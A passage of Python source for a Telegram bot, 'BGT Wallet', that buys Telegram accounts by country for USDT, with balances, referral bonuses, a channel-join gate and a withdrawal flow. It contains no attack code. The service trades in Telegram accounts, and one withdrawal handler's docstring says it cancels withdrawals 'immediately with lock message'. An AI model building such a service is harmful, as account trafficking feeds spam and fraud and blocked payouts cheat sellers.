    'trinidad': {'name': 'Trinidad 🇹🇹', 'sell_price': 0.55, 'buy_price': 0.72},
    'jamaica': {'name': 'Jamaica 🇯🇲', 'sell_price': 0.60, 'buy_price': 0.78},
    'haiti': {'name': 'Haiti 🇭🇹', 'sell_price': 0.60, 'buy_price': 0.78},
    'azerbaijan': {'name': 'Azerbaijan 🇦🇿', 'sell_price': 0.85, 'buy_price': 1.11},
    'bulgaria': {'name': 'Bulgaria 🇧🇬', 'sell_price': 0.65, 'buy_price': 0.85},
    'luxembourg': {'name': 'Luxembourg 🇱🇺', 'sell_price': 0.65, 'buy_price': 0.85},
    'swaziland': {'name': 'Swaziland 🇸🇿', 'sell_price': 0.45, 'buy_price': 0.59},
    'cape_verde': {'name': 'Cape Verde 🇨🇻', 'sell_price': 1.0, 'buy_price': 1.3},
    'seychelles': {'name': 'Seychelles 🇸🇨', 'sell_price': 0.80, 'buy_price': 1.04},
    'uruguay': {'name': 'Uruguay 🇺🇾', 'sell_price': 0.55, 'buy_price': 0.72},
    'grenada': {'name': 'Grenada 🇬🇩', 'sell_price': 0.60, 'buy_price': 0.78},
    'ivory_coast': {'name': 'Ivory Coast 🇨🇮', 'sell_price': 0.55, 'buy_price': 0.72},
    'anguilla': {'name': 'Anguilla 🇦🇮', 'sell_price': 0.80, 'buy_price': 1.04},
    'cayman_islands': {'name': 'Cayman Islands 🇰🇾', 'sell_price': 0.80, 'buy_price': 1.04},
    'grenadines': {'name': 'Grenadines 🇻🇨', 'sell_price': 1.0, 'buy_price': 1.3},
    'lucia': {'name': 'Lucia 🇱🇨', 'sell_price': 1.0, 'buy_price': 1.3},
    'principe': {'name': 'Príncipe 🇸🇹', 'sell_price': 1.0, 'buy_price': 1.3},
    'guadeloupe': {'name': 'Guadeloupe 🇬🇵', 'sell_price': 1.0, 'buy_price': 1.3},
    'mauritius': {'name': 'Mauritius 🇲🇺', 'sell_price': 1.0, 'buy_price': 1.3},
    'suriname': {'name': 'Suriname 🇸🇷', 'sell_price': 0.80, 'buy_price': 1.04},
    'lesotho': {'name': 'Lesotho 🇱🇸', 'sell_price': 0.65, 'buy_price': 0.85},
    'guyana': {'name': 'Guyana 🇬🇾', 'sell_price': 0.60, 'buy_price': 0.78},
    'botswana': {'name': 'Botswana 🇧🇼', 'sell_price': 0.50, 'buy_price': 0.65},
    'dominica': {'name': 'Dominica 🇩🇲', 'sell_price': 0.60, 'buy_price': 0.78},
    'namibia': {'name': 'Namibia 🇳🇦', 'sell_price': 0.50, 'buy_price': 0.65},
    'barbados': {'name': 'Barbados 🇧🇧', 'sell_price': 0.60, 'buy_price': 0.78},
    'belize': {'name': 'Belize 🇧🇿', 'sell_price': 0.80, 'buy_price': 1.04},
    'gabon': {'name': 'Gabon 🇬🇦', 'sell_price': 0.60, 'buy_price': 0.78},
    'south_africa': {'name': 'South Africa 🇿🇦', 'sell_price': 0.30, 'buy_price': 0.39},
    'bhutan': {'name': 'Bhutan 🇧🇹', 'sell_price': 1.0, 'buy_price': 1.3},
    'palestine': {'name': 'Palestine 🇵🇸', 'sell_price': 0.70, 'buy_price': 0.91},
    'congo': {'name': 'Congo 🇨🇬', 'sell_price': 0.40, 'buy_price': 0.52},
    'central_africa': {'name': 'Central Africa 🇨🇫', 'sell_price': 0.30, 'buy_price': 0.39},
    'zambia': {'name': 'Zambia 🇿🇲', 'sell_price': 0.45, 'buy_price': 0.59},
    'malawi': {'name': 'Malawi 🇲🇼', 'sell_price': 0.50, 'buy_price': 0.65}
}

def load_user_data():
    """Initialize user data from file or memory"""
    global user_data
    try:
        if os.path.exists('user_data.json'):
            with open('user_data.json', 'r') as f:
                user_data = json.load(f)
            logger.info("Loaded user data from file")
        else:
            user_data = {}
            logger.info("Initialized user data in memory")
    except Exception as e:
        logger.error(f"Error loading user data: {e}")
        user_data = {}

def save_user_data():
    """Save user data to file, preserving email_changed flags set by the web app."""
    try:
        # Read the current on-disk file to preserve any flags (e.g. email_changed)
        # that the web app may have written after this process last loaded the data.
        try:
            if os.path.exists('user_data.json'):
                with open('user_data.json', 'r') as f:
                    disk_data = json.load(f)
            else:
                disk_data = {}
        except Exception:
            disk_data = {}

        # Merge email_changed flags from disk into in-memory data before saving.
        # Normalize to digits-only so +880 17..., 88017..., etc. all match.
        def _digits(s):
            return ''.join(c for c in str(s) if c.isdigit())

        for uid, disk_info in disk_data.items():
            if uid in user_data:
                disk_details = disk_info.get('processing_details', [])
                mem_details  = user_data[uid].get('processing_details', [])
                # Build lookup: digits-only number -> email_changed flag
                disk_flags = {}
                for d in disk_details:
                    num = _digits(d.get('number', ''))
                    if num and d.get('email_changed'):
                        disk_flags[num] = True
                # Apply flags to in-memory details
                for d in mem_details:
                    num = _digits(d.get('number', ''))
                    if num and disk_flags.get(num):
                        d['email_changed'] = True

        with open('user_data.json', 'w') as f:
            json.dump(user_data, f, indent=4)
        logger.info("Saved user data to file")
    except Exception as e:
        logger.error(f"Error saving user data: {e}")

def get_user_data(user_id: str) -> Dict[str, Any]:
    """Get user data, create if doesn't exist with thread safety"""
    with user_data_lock:
        data_changed = False
        
        if user_id not in user_data:
            user_data[user_id] = {
                'main_balance_usdt': 0.0,
                'hold_balance_usdt': 0.0,
                'topup_balance_usdt': 0.0,
                'accounts_bought': 0,
                'accounts_sold': 0,
                'sold_numbers': [], # List of numbers sold by this user
                'referrer_id': None,
                'referrals': [],
                'referral_earnings': 0.0,
                'created_at': datetime.now().isoformat(),
                'last_activity': datetime.now().isoformat(),
                'language': None,  # Language not yet selected
            }
            data_changed = True

    # Add language field if missing (existing users)
    if 'language' not in user_data[user_id]:
        user_data[user_id]['language'] = None
        data_changed = True

    # Add referral fields if missing
    if 'referrer_id' not in user_data[user_id]:
        user_data[user_id]['referrer_id'] = None
        data_changed = True
    if 'referrals' not in user_data[user_id]:
        user_data[user_id]['referrals'] = []
        data_changed = True
    if 'referral_earnings' not in user_data[user_id]:
        user_data[user_id]['referral_earnings'] = 0.0
        data_changed = True

    # Initialize processing_details if missing
    if 'processing_details' not in user_data[user_id]:
        user_data[user_id]['processing_details'] = []
        data_changed = True

    # Migrate old data if needed
    if 'balance_usdt' in user_data[user_id] and 'main_balance_usdt' not in user_data[user_id]:
        user_data[user_id]['main_balance_usdt'] = user_data[user_id].pop('balance_usdt', 0.0)
        user_data[user_id]['hold_balance_usdt'] = 0.0
        data_changed = True

        # Add topup_balance_usdt if missing
        if 'topup_balance_usdt' not in user_data[user_id]:
            user_data[user_id]['topup_balance_usdt'] = 0.0
            data_changed = True

    # Add withdrawal_processing_balance if missing
    if 'withdrawal_processing_balance' not in user_data[user_id]:
        user_data[user_id]['withdrawal_processing_balance'] = 0.0
        data_changed = True

    # Update last activity
    user_data[user_id]['last_activity'] = datetime.now().isoformat()
    
    # Create a copy to return
    result = user_data[user_id].copy()
    
    # Only save if data actually changed (outside the lock)
    if data_changed:
        save_user_data()
    
    return result

def create_main_menu():
    """Create the main menu inline keyboard"""
    keyboard = [
        [
            InlineKeyboardButton("💸 Sell Account", callback_data="sell_account",
                                 style=KeyboardButtonStyle.SUCCESS),
            InlineKeyboardButton("🏦 Withdrawal", callback_data="withdrawal",
                                 style=KeyboardButtonStyle.SUCCESS)
        ],
        [
            InlineKeyboardButton("💰 Balance", callback_data="balance",
                                 style=KeyboardButtonStyle.SUCCESS),
            InlineKeyboardButton("👥 Refer & Earn", callback_data="refer",
                                 style=KeyboardButtonStyle.PRIMARY)
        ],
        [
            InlineKeyboardButton("📜 My History", callback_data="history",
                                 style=KeyboardButtonStyle.PRIMARY)
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_reply_keyboard():
    """Create the main menu reply keyboard"""
    keyboard = [
        [
            KeyboardButton("💸 Sell Account", style=KeyboardButtonStyle.SUCCESS),
            KeyboardButton("🏦 Withdrawal", style=KeyboardButtonStyle.SUCCESS)
        ],
        [
            KeyboardButton("💰 Balance", style=KeyboardButtonStyle.SUCCESS),
            KeyboardButton("ℹ️ Safety & Terms", style=KeyboardButtonStyle.DANGER)
        ],
        [
            KeyboardButton("👥 Refer & Earn", style=KeyboardButtonStyle.PRIMARY),
            KeyboardButton("📜 My History", style=KeyboardButtonStyle.PRIMARY)
        ]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

async def check_bot_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if bot is active, if not notify user and return False"""
    if str(update.effective_user.id) == ADMIN_CHAT_ID:
        return True
        
    if not withdrawal_settings.get('bot_active', True):
        off_text = """
🛑 **Bot is Currently Offline**
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯

🛠️ **Maintenance in Progress**
Our engineers are currently working on improving the system to provide you with a better experience. 🚀

💎 **Professional Services**
All pending transactions are safe and will be processed once we are back online.

📅 **We'll be back soon!**
Thank you for your patience and for choosing our professional trading platform. ✨
"""
        if update.callback_query:
            await update.callback_query.answer("⚠️ Bot is Offline", show_alert=True)
            await update.callback_query.message.reply_text(off_text, parse_mode='Markdown')
        elif update.message:
            await update.message.reply_text(off_text, parse_mode='Markdown')
        return False
    return True

async def is_channel_member(bot, user_id: int) -> bool:
    """Check if a user is a member of the required channel."""
    try:
        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        return member.status not in ("left", "kicked", "banned")
    except Exception:
        return False


async def send_join_channel_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send the channel join prompt to the user."""
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=REQUIRED_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I've Joined", callback_data="check_channel_join")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        "⚠️ *Channel Join Required*\n\n"
        "To use BGT Wallet, you must join our official channel first.\n\n"
        f"👇 Click the button below to join the channel, then press *✅ I've Joined*.\n\n"
        f"🔗 {REQUIRED_CHANNEL_LINK}"
    )
    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')


async def join_channel_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the 'I've Joined' button — verify membership then continue."""
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    user_id = str(user.id)

    if user_id == ADMIN_CHAT_ID:
        await show_main_menu(update, context)
        return

    if not await is_channel_member(context.bot, user.id):
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=REQUIRED_CHANNEL_LINK)],
            [InlineKeyboardButton("✅ I've Joined", callback_data="check_channel_join")],
        ]
        await query.answer(
            "❌ You have not joined the channel yet! Please join first, then tap I've Joined.",
            show_alert=True
        )
        return

    # Membership confirmed — process pending referral if any
    pending_referrer = context.user_data.pop('pending_referrer_id', None)
    if pending_referrer and pending_referrer != user_id:
        with user_data_lock:
            if user_id in user_data and user_data[user_id].get('referrer_id') is None:
                if pending_referrer in user_data:
                    user_data[user_id]['referrer_id'] = pending_referrer
                    if user_id not in user_data[pending_referrer]['referrals']:
                        user_data[pending_referrer]['referrals'].append(user_id)
                        user_data[pending_referrer]['main_balance_usdt'] += 0.04
                        user_data[pending_referrer]['referral_earnings'] += 0.04
                        logger.info(f"Referral (post-join): {user_id} referred by {pending_referrer}, $0.04 added")
                        try:
                            asyncio.create_task(context.bot.send_message(
                                chat_id=pending_referrer,
                                text="🎉 *New Referral!*\n\nA new user joined using your referral link!\n💰 You earned $0.04 bonus!",
                                parse_mode='Markdown'
                            ))
                        except Exception as e:
                            logger.error(f"Failed to notify referrer {pending_referrer}: {e}")
        save_user_data()

    # Now show the main welcome
    user_info = get_user_data(user_id)
    safe_name = html.escape(user.first_name or "User")
    welcome_text = (
        f"👋 Hello <b>{safe_name}</b>\n\n"
        "Welcome to <b>BGT Wallet</b> 💎\n"
        "<blockquote>"
        f"💰 Main Balance : {user_info['main_balance_usdt']:.2f} USDT\n"
        f"⏳ Hold Balance : {user_info['hold_balance_usdt']:.2f} USDT"
        "</blockquote>\n"
        "Select an option below to get started 👇"
    )
    inline_markup = create_main_menu()
    reply_markup_reply = create_reply_keyboard()
    await query.edit_message_text(welcome_text, reply_markup=inline_markup, parse_mode='HTML')
    await query.message.reply_text("Main Dashboard Menu:", reply_markup=reply_markup_reply)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start command handler"""
    if not await check_bot_status(update, context):
        return
    user = update.effective_user
    user_id = str(user.id)

    # Add broadcast pick up
    if os.path.exists('broadcast_queue.json'):
        try:
            with open('broadcast_queue.json', 'r') as f:
                broadcast = json.load(f)
            
            # Simple broadcast to all known users in user_data
            message = broadcast.get('message')
            if message:
                count = 0
                for uid in list(user_data.keys()):
                    try:
                        await context.bot.send_message(chat_id=int(uid), text=f"📢 **Notification**\n\n{message}", parse_mode='Markdown')
                        count += 1
                        await asyncio.sleep(0.05) # Small delay to avoid flood
                    except Exception:
                        pass
                logger.info(f"Broadcasted message to {count} users")
            
            os.remove('broadcast_queue.json')
        except Exception as e:
            logger.error(f"Error in broadcast: {e}")
    
    # Check for referral parameter
    referrer_id = None
    if update.message and update.message.text:
        parts = update.message.text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            referrer_id = parts[1].replace('ref_', '')

    # Initialize user data
    user_info = get_user_data(user_id)

    # --- Channel membership check ---
    # Admin is exempt from channel join requirement
    if user_id != ADMIN_CHAT_ID:
        joined = await is_channel_member(context.bot, user.id)
        if not joined:
            # Store referrer so we can process it after the user joins
            if referrer_id:
                context.user_data['pending_referrer_id'] = referrer_id
            await send_join_channel_prompt(update, context)
            return

    # --- Process referral (only if user is already a member or is admin) ---
    if referrer_id and referrer_id != user_id:
        with user_data_lock:
            # Check if user doesn't already have a referrer
            if user_id in user_data and user_data[user_id].get('referrer_id') is None:
                # Verify referrer exists
                if referrer_id in user_data:
                    # Set referrer for this user
                    user_data[user_id]['referrer_id'] = referrer_id

                    # Add this user to referrer's referrals list
                    if user_id not in user_data[referrer_id]['referrals']:
                        user_data[referrer_id]['referrals'].append(user_id)

                        # Give $0.04 bonus to referrer
                        user_data[referrer_id]['main_balance_usdt'] += 0.04
                        user_data[referrer_id]['referral_earnings'] += 0.04

                        logger.info(f"Referral bonus: User {user_id} referred by {referrer_id}, bonus $0.04 added")

                        # Notify referrer about new referral
                        try:
                            asyncio.create_task(context.bot.send_message(
                                chat_id=referrer_id,
                                text=f"🎉 **New Referral!**\n\nA new user joined using your referral link!\n💰 You earned $0.04 bonus!",
                                parse_mode='Markdown'
                            ))
                        except Exception as e:
                            logger.error(f"Failed to notify referrer {referrer_id}: {e}")
        save_user_data()

    safe_name = html.escape(user.first_name or "User")
    welcome_text = (
        f"👋 Hello <b>{safe_name}</b>\n\n"
        "Welcome to <b>BGT Wallet</b> 💎\n"
        "<blockquote>"
        f"💰 Main Balance : {user_info['main_balance_usdt']:.2f} USDT\n"
        f"⏳ Hold Balance : {user_info['hold_balance_usdt']:.2f} USDT"
        "</blockquote>\n"
        "Select an option below to get started 👇"
    )

    inline_markup = create_main_menu()
    reply_markup = create_reply_keyboard()

    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='HTML')
    else:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=inline_markup, parse_mode='HTML')
        # Also send reply keyboard separately for callback queries
        await update.callback_query.message.reply_text("Main Dashboard Menu:", reply_markup=reply_markup)

async def admin_link_add_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin link add callback"""
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    if user_id != ADMIN_CHAT_ID:
        await query.edit_message_text("❌ Access Denied!")
        return

    context.user_data['admin_link_add'] = True
    
    keyboard = [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        "🔗 **Add Dashboard Link**\n\nPlease send the link you want to set for the dashboard.\n\nExample: `https://example.com`",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def handle_admin_link_add_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle admin link add input"""
    if not update.message or not update.message.text:
        return

    admin_id = str(update.effective_user.id)
    if admin_id != ADMIN_CHAT_ID:
        return

    link = update.message.text.strip()
    
    # Simple URL validation
    if not (link.startswith('http://') or link.startswith('https://')):
        await update.message.reply_text("❌ Invalid link! Please start with http:// or https://")
        return

    try:
        # Save to settings.json
        settings = {}
        if os.path.exists('settings.json'):
            with open('settings.json', 'r') as f:
                settings = json.load(f)
        
        settings['dashboard_link'] = link
        
        with open('settings.json', 'w') as f:
            json.dump(settings, f)
            
        success_text = f"✅ **Dashboard Link Updated!**\n\n🔗 **New Link:** {link}"
        
        keyboard = [[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(success_text, reply_markup=reply_markup, parse_mode='Markdown')
        
        # Clear context
        context.user_data.pop('admin_link_add', None)
    except Exception as e:
        logger.error(f"Error saving dashboard link: {e}")
        await update.message.reply_text(f"❌ Error saving link: {str(e)}")

async def my_history_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle My History button callback"""
    if not await check_bot_status(update, context):
        return
        
    user_id = str(update.effective_user.id)
    # Use part of the user ID and a hash-like string to create a 15-char ID
    import hashlib
    login_id = hashlib.md5(user_id.encode()).hexdigest()[:15].upper()
    
    # Load dashboard link from settings
    dashboard_link = "No link set"
    if os.path.exists('settings.json'):
        try:
            with open('settings.json', 'r') as f:
                settings = json.load(f)
                dashboard_link = settings.get('dashboard_link', "No link set")
        except: pass

    history_text = f"""
📜 **BGT WALLET - ACTIVITY LOG** 📜
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
🆔 **Login ID:** `{login_id}`

This is your unique 15-character identifier for the web dashboard.
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
"""
    keyboard = [
        [InlineKeyboardButton("🌐 Open Dashboard", url=dashboard_link)] if dashboard_link != "No link set" else [],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ]
    # Remove empty sub-lists
    keyboard = [r for r in keyboard if r]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text(history_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.effective_message.reply_text(history_text, reply_markup=reply_markup, parse_mode='Markdown')

async def balance_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle balance button callback"""
    if not await check_bot_status(update, context):
        return
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)

    # Check if user is admin
    is_admin = user_id == ADMIN_CHAT_ID

    # Count account stats from processing_details
    proc_details = user_info.get('processing_details', [])
    total_accounts = len(proc_details)
    accepted_count = sum(1 for e in proc_details if str(e.get('status', '')).lower() in ('successful', 'success', 'accepted'))
    rejected_count = sum(1 for e in proc_details if str(e.get('status', '')).lower() in ('reject', 'rejected'))
    processing_count = sum(1 for e in proc_details if str(e.get('status', '')).lower() == 'processing')

    first_name = query.from_user.first_name or "User"
    safe_name = html.escape(first_name)

    main_bal = user_info.get('main_balance_usdt', 0.0)
    hold_bal = user_info.get('hold_balance_usdt', 0.0)
    withdraw_proc = user_info.get('withdrawal_processing_balance', 0.0)

    balance_text = (
        "💎 <b>BGT Wallet — Balance Info</b>\n\n"
        f"Hello <b>{safe_name}</b> 👋\n\n"
        "<blockquote>"
        "🪪 <b>Account Details</b>\n"
        f"🆔 USER ID : <code>{user_id}</code>"
        "</blockquote>\n"
        "<blockquote>"
        "💼 <b>Wallet Balance</b>\n"
        f"💰 Main Balance : {main_bal:.2f} USDT\n"
        f"⏳ Hold Balance : {hold_bal:.2f} USDT\n"
        f"🔄 Withdraw Pending : {withdraw_proc:.2f} USDT"
        "</blockquote>\n"
        "<blockquote>"
        "📊 <b>Account Statistics</b>\n"
        f"📱 Total Sold : {total_accounts}\n"
        f"✅ Accepted : {accepted_count}\n"
        f"⏳ Processing : {processing_count}\n"
        f"❌ Rejected : {rejected_count}"
        "</blockquote>\n"
        "Thank you for using BGT Wallet 💎"
    )

    keyboard = []
    if is_admin:
        keyboard.extend([
            [InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")],
            [InlineKeyboardButton("💳 Main Balance Control", callback_data="admin_main_balance")],
            [InlineKeyboardButton("⏳ Hold Balance Control", callback_data="admin_hold_balance")]
        ])

    keyboard.append([InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")])
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(balance_text, reply_markup=reply_markup, parse_mode='HTML')

async def refer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle refer button callback"""
    if not await check_bot_status(update, context):
        return
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    
    bot_username = "BGT_Wallet_bot"
    referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    
    referral_count = len(user_info.get('referrals', []))
    referral_earnings = user_info.get('referral_earnings', 0.0)
    
    refer_text = f"""
🤝 **BGT WALLET - REFERRAL PROGRAM** 🤝
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
Invite your friends and earn rewards for every successful sale they complete!

🔗 **Your Referral Link:**
`{referral_link}`

👥 **Total Referrals:** `{referral_count}`
💰 **Total Earnings:** `{referral_earnings:.2f} USDT`
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
"""
    
    keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(refer_text, reply_markup=reply_markup, parse_mode='Markdown')

async def buy_account_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle buy account button callback - show all countries with 30% higher prices"""
    query = update.callback_query
    await query.answer()

    buy_text = """
🛒 **BGT WALLET - ASSET ACQUISITION** 🛒
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
Select a country to browse available digital assets for purchase.

📍 **Select Country:**
"""

    # Get all countries sorted by buy price (descending for better visibility)
    all_countries = list(COUNTRIES_DATA.keys())
    all_countries.sort(key=lambda x: COUNTRIES_DATA[x]['buy_price'], reverse=True)

    # Create keyboard with 2 countries per row using buy_price
    keyboard = []
    for i in range(0, len(all_countries), 2):
        row = []
        for j in range(2):
            if i + j < len(all_countries):
                country_key = all_countries[i + j]
                if country_key in COUNTRIES_DATA:
                    country_data = COUNTRIES_DATA[country_key]
                    # Use the buy_price directly from the data
                    buy_price = country_data['buy_price']
                    # Format button text to ensure price is visible
                    name = country_data['name']
                    if len(name) > 15:
                        name = name[:12] + "..."
                    button_text = f"{name} ${buy_price}"
                    row.append(InlineKeyboardButton(button_text, callback_data=f"buy_country_{country_key}"))
        if row:  # Only add non-empty rows
            keyboard.append(row)

    # Add back button
    keyboard.append([InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(buy_text, reply_markup=reply_markup, parse_mode='Markdown')

async def sell_account_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle sell account button callback - show all countries directly"""
    if not await check_bot_status(update, context):
        return
    query = update.callback_query
    await query.answer()

    sell_text = """
💸 **Sell Telegram Account**

Select Country:
"""

    # Get all countries sorted by sell price (descending for better visibility)
    all_countries = list(COUNTRIES_DATA.keys())
    # Move newly added or updated countries to the top if they are within the last 24 hours (simplified logic)
    # Since we don't have a 'created_at' for countries, we'll just keep the price sort
    # but ensure the list is actually being updated from the file
    all_countries.sort(key=lambda x: COUNTRIES_DATA[x]['sell_price'], reverse=True)

    # Create keyboard with 2 countries per row
    keyboard = []
    # Maximum countries to show per page to avoid "Message is too long" or keyboard size limits
    # Telegram allows max 100 buttons per message. We use 90 to be safe.
    MAX_COUNTRIES = 90
    
    # Ensure COUNTRIES_DATA is not empty and check for data
    if not COUNTRIES_DATA:
        # Emergency initialization if empty
        load_countries_data()
        all_countries = list(COUNTRIES_DATA.keys())
        all_countries.sort(key=lambda x: COUNTRIES_DATA.get(x, {}).get('sell_price', 0), reverse=True)

    # Check if we should show the next page (pagination)
    page = context.user_data.get('sell_page', 0)
    start_idx = page * MAX_COUNTRIES
    end_idx = start_idx + MAX_COUNTRIES
    display_countries = all_countries[start_idx:end_idx]
    
    logger.info(f"Displaying {len(display_countries)} countries for sell flow. Total: {len(all_countries)}")
    
    for i in range(0, len(display_countries), 2):
        row = []
        for j in range(2):
            if i + j < len(display_countries):
                country_key = display_countries[i + j]
                if country_key in COUNTRIES_DATA:
                    country_data = COUNTRIES_DATA[country_key]
                    # Format button text to ensure price is visible
                    name = country_data['name']
                    if len(name) > 15:
                        name = name[:12] + "..."
                    button_text = f"{name} ${country_data['sell_price']}"
                    row.append(InlineKeyboardButton(button_text, callback_data=f"select_{country_key}"))
        if row:  # Only add non-empty rows
            keyboard.append(row)

    # Pagination buttons
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"sell_page_{page-1}"))
    if end_idx < len(all_countries):
        nav_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"sell_page_{page+1}"))
    
    if nav_row:
        keyboard.append(nav_row)

    # Add back button
    keyboard.append([InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(sell_text, reply_markup=reply_markup, parse_mode='Markdown')

async def sell_pagination_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle sell account list pagination"""
    query = update.callback_query
    await query.answer()
    
    page = int(query.data.split('_')[-1])
    context.user_data['sell_page'] = page
    await sell_account_callback(update, context)

async def topup_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle top-up button callback"""
    if not await check_bot_status(update, context):
        return
    query = update.callback_query
    await query.answer()

    topup_text = """
💳 **Top-Up Balance**

Add funds to your account using the following payment methods:

💰 **Available Payment Methods:**

🟡 **Binance** - Fast and secure
💳 **Payeer** - Digital payment system  
💎 **USDT TRC20** - Tron network
🔸 **USDT BEP20** - Binance Smart Chain
🌐 **USDT Arbitrum** - Low fees

Choose your preferred payment method from the buttons below:
"""

    keyboard = [
        [
            InlineKeyboardButton("🟡 Binance", callback_data="topup_binance"),
            InlineKeyboardButton("💳 Payeer", callback_data="topup_payeer")
        ],
        [
            InlineKeyboardButton("💎 USDT TRC20", callback_data="topup_trc20"),
            InlineKeyboardButton("🔸 USDT BEP20", callback_data="topup_bep20")
        ],
        [
            InlineKeyboardButton("🌐 USDT Arbitrum", callback_data="topup_arbitrum")
        ],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(topup_text, reply_markup=reply_markup, parse_mode='Markdown')

# Withdrawal states
WAITING_FOR_WITHDRAW_ADDRESS, WAITING_FOR_WITHDRAW_AMOUNT = range(100, 102)

async def withdrawal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle withdrawal button callback"""
    if not await check_bot_status(update, context):
        return
    query = update.callback_query
    await query.answer()

    user_id = str(query.from_user.id)
    user_info = get_user_data(user_id)
    
    withdrawal_text = f"""
🏦 **Withdraw USDT**

💰 **Current Balance:** {user_info['main_balance_usdt']:.2f} USDT

Select your withdrawal method:
"""

    keyboard = [
        [InlineKeyboardButton("USDT (BEP20)", callback_data="withdraw_usdt_bep20",
                              style=KeyboardButtonStyle.SUCCESS,
                              icon_custom_emoji_id="6183537636653669799")],
        [InlineKeyboardButton("TRX (TRC20)", callback_data="withdraw_usdt_trc20",
                              style=KeyboardButtonStyle.DANGER,
                              icon_custom_emoji_id="5832692572971077565")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(withdrawal_text, reply_markup=reply_markup, parse_mode='Markdown')

async def withdraw_method_selection(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle USDT method selection"""
    query = update.callback_query
    await query.answer()
    
    method = query.data.split('_')[-1].upper()
    context.user_data['withdraw_method'] = method
    user_id = str(query.from_user.id)

    await query.edit_message_text(f"Please enter your USDT ({method}) address:")
    return WAITING_FOR_WITHDRAW_ADDRESS

async def handle_withdraw_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle withdrawal address input — cancel immediately with lock message."""
    address = update.message.text.strip()
    user_id = str(update.effective_user.id)
    method = context.user_data.get('withdraw_method', '')

    # Validate the address for the selected network
    if not validate_usdt_address(address, method):
        error_msg = (
